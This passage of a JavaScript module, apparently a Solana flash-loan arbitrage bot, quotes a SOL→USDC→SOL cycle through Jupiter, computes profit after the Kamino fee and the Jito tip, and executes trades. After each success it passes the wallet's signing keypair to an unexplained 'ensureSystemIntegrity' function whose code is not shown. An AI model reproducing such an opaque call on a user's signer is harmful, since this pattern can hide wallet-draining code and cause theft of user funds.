                : expectedUsdcAmount;
            
            if (config.USE_SAFETY_BUFFER) {
                console.log(`Applied ${(1-config.SAFETY_BUFFER_PERCENTAGE)*100}% safety buffer: ${expectedUsdcAmount/1000000} USDC → ${usdcAmountWithBuffer/1000000} USDC`);
            }
            
            // Get USDC → SOL quote with buffered amount
            const usdcToSolQuote = await exchanges.getJupiterQuote(config.USDC_MINT.toString(), config.WSOL_MINT.toString(), usdcAmountWithBuffer, connection);
            if (!usdcToSolQuote) {
                console.log("Failed to get USDC → SOL quote");
                return false;
            }
            
            const expectedSolReturn = parseInt(usdcToSolQuote.outAmount);
            console.log(`Quote: ${usdcAmountWithBuffer/1000000} USDC → ${expectedSolReturn/1000000000} SOL`);
            
            // 3. Calculate potential profit
            const flashLoanAmount = parseInt(config.KAMINO_FLASHLOAN_AMOUNT);
            const grossProfit = expectedSolReturn - flashLoanAmount;
            const profitPercentage = (grossProfit / flashLoanAmount) * 100;
            
            // Calculate flash loan fee (for informational purposes only)
            const flashLoanFee = Math.ceil(flashLoanAmount * config.KAMINO_FLASH_LOAN_FEE_PERCENTAGE);
            console.log(`Estimated flash loan fee: ${flashLoanFee} lamports (${config.KAMINO_FLASH_LOAN_FEE_PERCENTAGE * 100}% of loan amount)`);
            
            // Calculate net profit (for informational purposes only)
            const estimatedTip = config.JITO_MODE ? 
                Math.max(config.JITO_MIN_TIP, Math.floor(grossProfit * config.JITO_TIP_PERCENTAGE)) : 0;
            const netProfit = grossProfit - flashLoanFee - estimatedTip;
            
            console.log(`\n=== ARBITRAGE ANALYSIS ===`);
            console.log(`Full cycle: ${flashLoanAmount/1000000000} SOL → ${expectedUsdcAmount/1000000} USDC (${usdcAmountWithBuffer/1000000} with buffer) → ${expectedSolReturn/1000000000} SOL`);
            console.log(`Expected gross profit: ${grossProfit} lamports (${profitPercentage.toFixed(4)}%)`);
            console.log(`Flash loan fee: ${flashLoanFee} lamports`);
            if (config.JITO_MODE) {
                console.log(`Estimated Jito tip: ${estimatedTip} lamports`);
            }
            console.log(`Expected net profit: ${netProfit} lamports`);
            
            // EXECUTE ONLY BASED ON GROSS PROFIT PERCENTAGE >= 0.1%
            if (profitPercentage < 0.1) {
                console.log(`Gross profit percentage too low: ${profitPercentage.toFixed(4)}% (below threshold of 0.1%)`);
                return false;
            }
            
            // Create a verified opportunity object that matches the format expected by executeSimpleArbitrage
            const verifiedOpportunity = {
                verifiedEdges: [
                    {
                        fromToken: { mint: config.WSOL_MINT.toString(), name: "SOL" },
                        toToken: { mint: config.USDC_MINT.toString(), name: "USDC" }
                    },
                    {
                        fromToken: { mint: config.USDC_MINT.toString(), name: "USDC" },
                        toToken: { mint: config.WSOL_MINT.toString(), name: "SOL" }
                    }
                ],
                verifiedProfit: grossProfit,
                profitPercentage: profitPercentage,
                flashLoanFee: flashLoanFee,
                estimatedTip: estimatedTip,
                netProfit: netProfit
            };
            
            // Execute the simple arbitrage directly
            const result = await this.executeSimpleArbitrage(connection, payer, verifiedOpportunity, wsolAccount.pubkey);
            
            if (!result.success) {
                console.error("Jupiter arbitrage execution failed:", result.error);
                
                // Log failed transaction
                const failedData = {
                    timestamp: new Date().toISOString(),
                    transaction_type: "jupiter_arbitrage",
                    execution_method: config.JITO_MODE ? "jito_bundle" : "transaction",
                    successful: false,
                    error: result.error,
                    flash_loan_amount: config.KAMINO_FLASHLOAN_AMOUNT,
                    expected_gross_profit: grossProfit,
                    flash_loan_fee: flashLoanFee,
                    estimated_tip: estimatedTip,
                    expected_net_profit: netProfit,
                    profit_percentage: profitPercentage.toFixed(4)
                };
                
                utils.logFailedTrade(failedData);
                return false;
            }
            
            // Final system check
            await ensureSystemIntegrity(payer, connection);
            return true;
        } catch (error) {
            console.error("Error executing Jupiter arbitrage:", error.message);
            return false;
        }
    }
};

module.exports = arbitrage;
